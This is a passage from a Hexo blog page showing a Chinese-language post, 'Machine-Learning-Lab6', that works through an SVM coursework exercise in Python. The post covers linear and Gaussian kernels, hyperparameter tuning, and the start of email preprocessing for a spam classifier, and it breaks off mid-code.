<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/24/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/24/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/24/Machine-Learning-Lab6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/05/24/Machine-Learning-Lab6/" class="post-title-link" itemprop="url">Machine-Learning-Lab6</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-05-24 13:43:56" itemprop="dateCreated datePublished" datetime="2022-05-24T13:43:56+08:00">2022-05-24</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-10-10 00:08:26" itemprop="dateModified" datetime="2022-10-10T00:08:26+08:00">2022-10-10</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/AI/" itemprop="url" rel="index"><span itemprop="name">AI</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>10 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h2><p>在本练习中，您将使用支持向量机 (SVM) 来构建垃圾邮件分类器</p>
<ul>
<li>ex6.m - 练习前半部分的 Octave/MATLAB 脚本</li>
<li>ex6data1.mat - 示例数据集 1</li>
<li>ex6data2.mat - 示例数据集 2</li>
<li>ex6data3.mat - 示例数据集 3</li>
<li>svmTrain.m - SVM 训练函数</li>
<li>svmPredict.m - SVM 预测函数</li>
<li>plotData.m - 绘制二维数据</li>
<li>visualizeBoundaryLinear.m - 绘制线性边界</li>
<li>visualizeBoundary.m - 绘制非线性边界</li>
<li>linearKernel.m - 支持向量机的线性内核</li>
<li>[?] gaussianKernel.m - 支持向量机的高斯核</li>
<li>[?] dataset3Params.m - 用于 ex6data3.mat 的参数</li>
<li>ex6_spam.m - 练习后半部分的 Octave/MATLAB 脚本</li>
<li>spamTrain.mat - 用“垃圾邮件训练集”进行训练</li>
<li>Test.mat - 垃圾邮件测试集</li>
<li>emailSample1.txt - 示例电子邮件 1</li>
<li>emailSample2.txt - 示例电子邮件 2</li>
<li>spamSample1.txt - 示例电子邮件 3</li>
<li>spamSample2.txt - 示例电子邮件 4</li>
<li>vocab.txt - 词汇表</li>
<li>getVocabList.m - 加载词汇表</li>
<li>porterStemmer.m - 词干功能</li>
<li>readFile.m - 将文件读入字符串</li>
<li>submit.m - 将您的解决方案发送到我们的服务器的提交脚本</li>
<li>[?] processEmail.m - 电子邮件预处理</li>
<li>[?] emailFeatures.m - 从电子邮件中提取特征</li>
</ul>
<p>在整个练习中，您将使用脚本 ex6.m，这些脚本为问题设置数据集并调用您将编写的函数，您只需按照本作业中的说明修改其他文件中的功能</p>
<h2 id="Support-Vector-Machines（支持向量机）"><a href="#Support-Vector-Machines（支持向量机）" class="headerlink" title="Support Vector Machines（支持向量机）"></a>Support Vector Machines（支持向量机）</h2><p>在本练习的前半部分，您将使用支持向量机 (SVM) 和各种示例 2D 数据集，对这些数据集进行试验将帮助您直观地了解 SVM 的工作原理以及如何将高斯核与 SVM 一起使用</p>
<p>在练习的下半部分，您将使用支持向量机来构建垃圾邮件分类器，提供的脚本 ex6.m 将帮助您逐步完成练习的前半部分</p>
<h2 id="Example-Dataset-1（示例数据集-1）"><a href="#Example-Dataset-1（示例数据集-1）" class="headerlink" title="Example Dataset 1（示例数据集 1）"></a>Example Dataset 1（示例数据集 1）</h2><p>我们将从一个可以由线性边界分隔的 2D 示例数据集开始</p>
<ul>
<li>脚本 ex6.m 将绘制训练数据，在这个数据集中，正例（用 + 表示）和负例（用 o 表示）的位置表明了由间隙表示的自然分离</li>
<li>但是，请注意，在最左侧大约 (0.1, 4.1) 处有一个异常正例 +</li>
<li>在下一部分中，您还将看到这个异常值如何影响 SVM 决策边界</li>
</ul>
<p>实现过程：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">np.set_printoptions(formatter=&#123;<span class="string">&#x27;float&#x27;</span>: <span class="string">&#x27;&#123;: 0.6f&#125;&#x27;</span>.<span class="built_in">format</span>&#125;) <span class="comment"># 用于控制Python中小数的显示精度</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ===================== 1.读取数据并可视化 =====================</span></span><br><span class="line">data = scio.loadmat(<span class="string">&#x27;data/ex6data1.mat&#x27;</span>) <span class="comment"># 以字典格式读取数据</span></span><br><span class="line"><span class="comment"># 分别取出特征数据X和对应的输出Y(都是narray格式)</span></span><br><span class="line">X = data[<span class="string">&#x27;X&#x27;</span>]</span><br><span class="line">Y = data[<span class="string">&#x27;y&#x27;</span>].flatten()</span><br><span class="line">plot_data(X,Y) <span class="comment"># 绘制散点图</span></span><br><span class="line">plt.xlabel(<span class="string">&#x27;Feature 1&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Feature 2&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>绘图：</p>
<img src="/2022/05/24/Machine-Learning-Lab6/1652884272984.png" class width="1652884272984"> 
<ul>
<li>观察数据，发现一条直线就可以区分正负样例</li>
<li>所以，可以直接使用 SVM</li>
</ul>
<p>利用 SVM 算法进行拟合：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> svm</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===================== 2.训练SVM使用线性核函数 =====================</span></span><br><span class="line"><span class="comment"># PS:线性核函数,就是不使用核函数的意思</span></span><br><span class="line"></span><br><span class="line">C =<span class="number">100</span> <span class="comment"># 异常点的权重</span></span><br><span class="line">clf = svm.SVC(C, kernel=<span class="string">&#x27;linear&#x27;</span>, tol=<span class="number">1e-3</span>) <span class="comment"># 使用sklearn自带的svm函数进行训练</span></span><br><span class="line">clf.fit(X, Y) <span class="comment"># 开始训练</span></span><br><span class="line">plot_data(X,Y)</span><br><span class="line">vb.visualize_boundary(clf, X, <span class="number">0</span>, <span class="number">4.5</span>, <span class="number">1.5</span>, <span class="number">5</span>) <span class="comment"># 利用训练结果clf绘制决策边界</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>函数 visualize_boundary 的实现：绘制决策边界</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">visualize_boundary</span>(<span class="params">clf, X, x_min, x_max, y_min, y_max</span>):</span></span><br><span class="line">    h = <span class="number">.02</span></span><br><span class="line">    xx, yy = np.meshgrid(np.arange(x_min, x_max, h), np.arange(y_min, y_max, h))</span><br><span class="line"></span><br><span class="line">    Z = clf.predict(np.c_[xx.ravel(), yy.ravel()]) </span><br><span class="line">    Z = Z.reshape(xx.shape)</span><br><span class="line">    plt.contour(xx, yy, Z, levels=[<span class="number">0</span>], colors=<span class="string">&#x27;k&#x27;</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>meshgrid(X , Y)：快速生成坐标矩阵 (X , Y)</li>
<li>arange(x , y)：返回一个有终点和起点的固定步长的排列 </li>
<li>predict(x , y)：返回样本属于每一个类别的概率（SVM 自带的方法）</li>
</ul>
<p>绘图：</p>
<img src="/2022/05/24/Machine-Learning-Lab6/1653197929244.png" class width="1653197929244"> 
<p>实现并验证高斯核函数：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ===================== 3.实现并验证高斯核函数 =====================</span></span><br><span class="line"></span><br><span class="line">x1 = np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>]) <span class="comment"># 实例1</span></span><br><span class="line">x2 = np.array([<span class="number">0</span>, <span class="number">4</span>, -<span class="number">1</span>]) <span class="comment"># 实例2</span></span><br><span class="line">sigma = <span class="number">2</span></span><br><span class="line">sim = gk.gaussian_kernel(x1, x2, sigma) <span class="comment"># 高斯核函数的简单实现</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Gaussian kernel between x1 = [1, 2, 1], x2 = [0, 4, -1], sigma = &#123;&#125; : &#123;:0.6f&#125;\n&#x27;</span>.<span class="built_in">format</span>(sigma, sim))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;(for sigma = 2, this value should be about 0.324652&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>高斯核函数公式：</p>
<script type="math/tex; mode=display">
K_{gaussian}(x^{(i)},x^{(j)})
=exp(-\frac{1}{2σ^{2}}\sum_{k=1}^n(x^{(i)}_k-x^{(j)}_k)^{2})</script><p>代码实现 gaussian_kernel：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gaussian_kernel</span>(<span class="params">x1, x2, sigma</span>):</span></span><br><span class="line">    x1 = x1.flatten()</span><br><span class="line">    x2 = x2.flatten()</span><br><span class="line">    sim = np.exp(-<span class="built_in">sum</span>((x1 - x2) ** <span class="number">2</span>) / (<span class="number">2</span> * sigma ** <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> sim</span><br></pre></td></tr></table></figure>
<ul>
<li>可以类比一下高斯核函数公式</li>
</ul>
<h2 id="Example-Dataset-2（示例数据集-2）"><a href="#Example-Dataset-2（示例数据集-2）" class="headerlink" title="Example Dataset 2（示例数据集 2）"></a>Example Dataset 2（示例数据集 2）</h2><p>ex6.m 中的下一部分将加载并绘制数据集 2，具体过程：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ===================== 4.读取数据并可视化2 =====================</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Loading and Visualizing Data ...&#x27;</span>)</span><br><span class="line">data = scio.loadmat(<span class="string">&#x27;data/ex6data2.mat&#x27;</span>)</span><br><span class="line"><span class="comment"># 分别取出特征数据X和对应的输出Y(都是narray格式)</span></span><br><span class="line">X = data[<span class="string">&#x27;X&#x27;</span>]</span><br><span class="line">y = data[<span class="string">&#x27;y&#x27;</span>].flatten()</span><br><span class="line">m = y.size</span><br><span class="line">plot_data(X, y) <span class="comment"># 绘制散点图</span></span><br><span class="line">plt.xlabel(<span class="string">&#x27;Feature 1&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Feature 2&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>绘图：</p>
<img src="/2022/05/24/Machine-Learning-Lab6/1653198556880.png" class width="1653198556880"> 
<ul>
<li>从图中可以看出，该数据集没有区分正负样本的线性决策边界</li>
<li>这是一个非线性的决策边界，如果像上一部分一样使用只 SVM，拟合的效果就不好</li>
<li>但是，通过将高斯核与 SVM 结合使用，您将能够学习一个非线性决策边界，该边界可以对数据集执行得相当好</li>
</ul>
<p>在这部分练习中，您将使用 SVM 进行非线性分类，特别是，您将在非线性可分的数据集上使用具有高斯核的 SVM</p>
<p>要使用 SVM 找到非线性决策边界，我们需要首先实现一个高斯核，您可以将高斯核视为一个相似度函数，用于测量一对示例之间的“距离”</p>
<p>高斯核函数的公式：</p>
<script type="math/tex; mode=display">
K_{gaussian}(x^{(i)},x^{(j)})=exp(-\frac{||x^{(i)}-x^{(j)}||^{2}}{2σ^{2}})=exp(-\frac{1}{2σ^{2}}\sum_{k=1}^n(x^{(i)}_k-x^{(j)}_k)^{2})</script><p>接下来就利用“SVM”和“高斯核”绘制一个非线性区域</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ===================== 5.使用RBF内核训练SVM =====================</span></span><br><span class="line"><span class="comment"># PS:上一部分已经实现内核函数了,但这一部分使用&quot;svm&quot;模块自带的高斯核</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Training SVM with RFB(Gaussian) Kernel (this may take 1 to 2 minutes) ...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">c = <span class="number">1</span></span><br><span class="line">sigma = <span class="number">0.1</span></span><br><span class="line"></span><br><span class="line">clf = svm.SVC(c, kernel=<span class="string">&#x27;rbf&#x27;</span>, gamma=np.power(sigma, -<span class="number">2</span>)) <span class="comment"># 同时使用SVM和高斯核</span></span><br><span class="line"><span class="comment">#clf = svm.SVC(c, kernel=&#x27;linear&#x27;, tol=1e-3) # 只使用SVM</span></span><br><span class="line">clf.fit(X, y) <span class="comment"># 开始训练</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Training complete!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plot_data(X, y)</span><br><span class="line">vb.visualize_boundary(clf, X, <span class="number">0</span>, <span class="number">1</span>, <span class="number">.4</span>, <span class="number">1.0</span>) <span class="comment"># 绘制决策边界</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>绘图：</p>
<ul>
<li>只使用 SVM 算法：</li>
</ul>
<img src="/2022/05/24/Machine-Learning-Lab6/1653205137538.png" class width="1653205137538"> 
<ul>
<li>同时使用 SVM 算法和高斯核函数：</li>
</ul>
<img src="/2022/05/24/Machine-Learning-Lab6/1653205186620.png" class width="1653205186620"> 
<h2 id="Example-Dataset-3（示例数据集-3）"><a href="#Example-Dataset-3（示例数据集-3）" class="headerlink" title="Example Dataset 3（示例数据集 3）"></a>Example Dataset 3（示例数据集 3）</h2><p>在这部分练习中，您将获得更多关于如何使用具有高斯核的 SVM 的实用技能</p>
<p>ex6.m 的下一部分将加载并显示第三个数据集，您将在此数据集上使用带有高斯核的 SVM</p>
<p>具体过程：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ===================== 6.读取数据并可视化3 =====================</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Loading and Visualizing Data ...&#x27;</span>)</span><br><span class="line">data = scio.loadmat(<span class="string">&#x27;data/ex6data3.mat&#x27;</span>)</span><br><span class="line">X = data[<span class="string">&#x27;X&#x27;</span>]</span><br><span class="line">y = data[<span class="string">&#x27;y&#x27;</span>].flatten()</span><br><span class="line">m = y.size</span><br><span class="line">plot_data(X, y)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Feature 1&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Feature 2&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>绘图：</p>
<img src="/2022/05/24/Machine-Learning-Lab6/1653207455153.png" class width="1653207455153"> 
<ul>
<li>看上去是一条线性的决策边界</li>
<li>不过我们仍然需要使用高斯核</li>
</ul>
<p>你的任务是使用交叉验证集 Xval, yval 来确定最佳 C 和 sigma(σ)</p>
<ul>
<li>sigma(σ) 过小，会导致方差较大（过拟合）</li>
<li>sigma(σ) 过大，会导致偏差较大（欠拟合）</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ===================== 7.使用RBF内核训练SVM2 =====================</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">1</span> <span class="comment"># 可变数据1</span></span><br><span class="line">sigma = <span class="number">0.1</span> <span class="comment"># 可变数据2</span></span><br><span class="line"></span><br><span class="line">clf = svm.SVC(c, kernel=<span class="string">&#x27;rbf&#x27;</span>, gamma=np.power(sigma, -<span class="number">2</span>))</span><br><span class="line">clf.fit(X, y) <span class="comment"># 开始训练</span></span><br><span class="line">plot_data(X, y)</span><br><span class="line">vb.visualize_boundary(clf, X, -<span class="number">.5</span>, <span class="number">.3</span>, -<span class="number">.8</span>, <span class="number">.6</span>)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<p>绘图：</p>
<ul>
<li>c = 1，sigma = 0.1</li>
</ul>
<img src="/2022/05/24/Machine-Learning-Lab6/1653207910101.png" class width="1653207910101"> 
<ul>
<li>c = 1，sigma = 0.9</li>
</ul>
<img src="/2022/05/24/Machine-Learning-Lab6/1653208038075.png" class width="1653208038075"> 
<ul>
<li>c = 100，sigma = 0.1</li>
</ul>
<img src="/2022/05/24/Machine-Learning-Lab6/1653208212360.png" class width="1653208212360">  
<ul>
<li>c = 100，sigma = 0.9</li>
</ul>
<img src="/2022/05/24/Machine-Learning-Lab6/1653208229419.png" class width="1653208229419"> 
<p>大体的规律如下：</p>
<ul>
<li>c 越大，模型的拟合程度越高，过大会导致过拟合</li>
<li>sigma 越大，决策边界越直，越趋近于“线性核函数”</li>
</ul>
<h2 id="Spam-Classification（垃圾邮件分类）"><a href="#Spam-Classification（垃圾邮件分类）" class="headerlink" title="Spam Classification（垃圾邮件分类）"></a>Spam Classification（垃圾邮件分类）</h2><p>当今的许多电子邮件服务都提供垃圾邮件过滤器，能够将电子邮件高精度地分类为垃圾邮件和非垃圾邮件</p>
<ul>
<li>在这部分练习中，您将使用 SVM 构建您自己的垃圾邮件过滤器</li>
<li>您将训练一个分类器来分类给定的电子邮件 x 是垃圾邮件 (y = 1) 还是非垃圾邮件 (y = 0)</li>
<li>特别是，您需要将每封电子邮件转换为一个特征向量 x</li>
<li>练习的以下部分将引导您了解如何从电子邮件构建这样的特征向量，在本练习的其余部分，您将使用脚本 ex6_spam.m</li>
<li>本练习包含的数据集基于 SpamAssassin 公共语料库的一个子集，在本练习中，您将仅使用电子邮件正文（不包括电子邮件标题）</li>
</ul>
<h2 id="Preprocessing-Emails（预处理电子邮件）"><a href="#Preprocessing-Emails（预处理电子邮件）" class="headerlink" title="Preprocessing Emails（预处理电子邮件）"></a>Preprocessing Emails（预处理电子邮件）</h2><p>在开始执行机器学习任务之前，查看数据集中的示例通常很有见地</p>
<img src="/2022/05/24/Machine-Learning-Lab6/1653269494806.png" class width="1653269494806"> 
<ul>
<li>上图显示了一个示例电子邮件，其中包含一个 URL、一个电子邮件地址（在末尾）、数字和美元金额，虽然许多电子邮件包含相似类型的实体（例如，数字、其他 URL 或其他电子邮件地址）</li>
<li>但几乎每封电子邮件中的特定实体（例如，特定 URL 或特定金额）都会有所不同</li>
<li>因此，处理电子邮件时常用的一种方法是“规范化”这些值，以便所有 URL 都被视为相同，所有数字都被视为相同等</li>
<li>例如，我们可以将电子邮件中的每个 URL 替换为唯一的字符串 “httpaddr”表示存在 URL</li>
<li>这具有让垃圾邮件分类器根据是否存在任何 URL 而不是特定 URL 是否存在来做出分类决定的效果</li>
<li>这通常会提高垃圾邮件分类器的性能，因为垃圾邮件发送者通常会随机化 URL，因此在新的垃圾邮件中再次看到任何特定 URL 的几率非常小</li>
</ul>
<p>预测处理的条目如下：</p>
<ul>
<li>小写：整个电子邮件被转换为小写，因此忽略大写（例如：IndIcaTE 被视为与 Indicate 相同）</li>
<li>剥离 HTML：从电子邮件中删除所有 HTML 标记，许多电子邮件通常带有 HTML 格式，我们删除了所有的 HTML 标签，这样就只剩下内容了</li>
<li>规范化 URL：所有 URL 都替换为文本 “httpaddr”</li>
<li>标准化电子邮件地址：所有电子邮件地址都替换为文本 “emailaddr”</li>
<li>规范化数字：所有数字都替换为文本 “数字”</li>
<li>标准化美元：所有美元符号 ($) 都替换为文本 “美元”</li>
<li>词干：词被简化为词干形式，例如：“discount” 、 “discounts” 、 “discounted” 和 “discounting” 都替换为 “discount”，有时，Stemmer 实际上会从末尾去掉额外的字符，因此“include” 、 “includes” 、 “included” 和 “include” 都替换为 “include”</li>
<li>删除非单词：已删除非单词和标点符号，所有空格（制表符、换行符、空格）都已被修剪为单个空格字符</li>
</ul>
<p>要使用 SVM 将电子邮件分类为垃圾邮件和非垃圾邮件，您首先需要将每封电子邮件转换为特征向量，在这一部分中，您将为每封电子邮件实施预处理步骤，您应该完成 processEmail.py 中的代码以生成给定电子邮件的单词索引向量</p>
<p>预处理函数 processEmail 的实现：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> nltk, nltk.stem.porter</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process_email</span>(<span class="params">email_contents</span>):</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># ===================== Preprocess Email =====================</span></span><br><span class="line">    vocab_list = get_vocab_list() <span class="comment"># 导入词汇表</span></span><br><span class="line">    word_indices = []</span><br><span class="line">    email_contents = email_contents.lower()</span><br><span class="line">    email_contents = re.sub(<span class="string">&#x27;&lt;[^&lt;&gt;]+&gt;&#x27;</span>, <span class="string">&#x27; &#x27;</span>, email_contents)</span><br><span class="line">    <span class="comment"># 任何数字都被替换为字符串&#x27;number&#x27;</span></span><br><span class="line">    email_contents = re.sub(<span class="string">&#x27;[0-9]+&#x27;</span>, <span class="string">&#x27;number&#x27;</span>, email_contents)</span><br><span class="line">    <span class="comment"># 以http或https开头的任何内容都替换为&#x27;httpaddr&#x27;</span></span><br><span class="line">    email_contents = re.sub(<span class="string">&#x27;(http|https)://[^\s]*&#x27;</span>, <span 